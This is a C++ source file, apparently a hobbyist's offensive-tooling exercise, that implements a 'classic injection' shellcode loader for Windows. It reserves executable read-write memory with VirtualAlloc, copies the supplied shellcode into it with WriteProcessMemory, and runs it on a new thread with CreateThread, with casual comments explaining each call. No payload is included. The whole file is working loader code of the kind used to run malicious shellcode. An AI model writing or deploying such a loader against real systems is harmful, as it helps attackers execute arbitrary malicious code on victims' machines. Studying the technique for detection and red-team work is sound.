#include <iostream>
#include "classic_injection.h"

void classic_injection(const unsigned char* shellcode, size_t shellcode_size){
    std::cout << "This is classic injection" << std::endl;

//     LPVOID VirtualAlloc(
//   [in, optional] LPVOID lpAddress,
//   [in]           SIZE_T dwSize,
//   [in]           DWORD  flAllocationType,
//   [in]           DWORD  flProtect
//     );

// this reserves the memopry for sc
    auto hMemory = VirtualAlloc(
        NULL, //freeball the allocations
        shellcode_size, // reserves the size of the sc
        MEM_COMMIT | MEM_RESERVE, //reserve and commit to mem 
        PAGE_EXECUTE_READWRITE //make it executable so rwx 
    );

//basic check to ensure that memory was actuall reserverd
//just adding this as a check for me so if u mysteriouly use my code and go why does this dude have a check 
    if(hMemory == NULL){
        std::cout << "Welp we failed to reserve memeory abandon ship, the resason is: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "Memory was reserved my lads. location at " << hMemory << std::endl;

    // this writes the sc to memomry
//     BOOL WriteProcessMemory(
//   [in]  HANDLE  hProcess,
//   [in]  LPVOID  lpBaseAddress,
//   [in]  LPCVOID lpBuffer,
//   [in]  SIZE_T  nSize,
//   [out] SIZE_T  *lpNumberOfBytesWritten
//   );
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(), 
        hMemory, // points to the memory where we want to write the sc to
        shellcode, // points to me sc
        shellcode_size, // size of the sc
        &bytesWritten // pointer to variable that receives the number of bytes written
    );

    //well here i got lazy couldnt fix the if issue sop just gonna output 
    
    std::cout << "Wrote " << bytesWritten << " bytes to memory" << std::endl;
//execute the sc
    DWORD ThreadId;
//     HANDLE CreateThread(
//   [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
//   [in]            SIZE_T                  dwStackSize,
//   [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
//   [in, optional]  __drv_aliasesMem LPVOID lpParameter,
//   [in]            DWORD                   dwCreationFlags,
//   [out, optional] LPDWORD                 lpThreadId
// );
    HANDLE hThread = CreateThread(
        NULL, //microsoft says always set this to null unless you know what your doing and i clearly dont so null
        0, //using default setting here 
        (LPTHREAD_START_ROUTINE)hMemory, //points to the memory we create at the start and where we wrote our sc too
        NULL, //optional so yeah null
        0, //create and run that thread my boiiiii
        &ThreadId //pointer to get the thread id
    );

    //safety check again lad for me use 
    //you can comment this out if u mysteriously use my code 

    if(hThread == NULL){
        std::cout << "Welp we failed to create the thread, the resason is: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "Thread was created yeppyy the thread id is: " << ThreadId << std::endl;

    //waait for thred to finish 
//     DWORD WaitForSingleObject(
//   [in] HANDLE hHandle,
//   [in] DWORD  dwMilliseconds
//    );
    WaitForSingleObject(
        hThread,
        INFINITE // wait forever 
    );

 // close thread cuz apparently its good practice and i like to follow shit i donno 
    CloseHandle(hThread);

// well mem cleanup cause its good practice again 
    VirtualFree(
        hMemory,
        0, 
        MEM_RELEASE
    );
    }